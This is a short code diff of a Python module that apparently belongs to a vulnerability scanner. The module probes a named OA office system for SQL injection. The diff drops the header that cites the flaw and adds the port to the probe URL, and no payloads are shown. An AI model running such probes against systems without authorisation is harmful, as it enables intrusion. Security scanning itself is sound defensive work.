@@ -1,11 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-'''
-name: 璐华OA系统多处SQL注入3
-referer: http://www.wooyun.org/bugs/wooyun-2010-0104430
-author: Lucifer
-description: ruvaroa多处SQL注入。
-'''
+
 import urllib
 import requests
 import logging
@@ -47,7 +42,7 @@ def medusa(Url,RandomAgent,ProxyIp):
     Medusas=[]
     try:
         for payload in payloads:
-            payload_url = scheme+"://"+url+payload
+            payload_url = scheme+"://"+url+ ':' + str(port)+payload
             headers = {
                 'Accept-Encoding': 'gzip, deflate',
                 'Accept': '*/*',
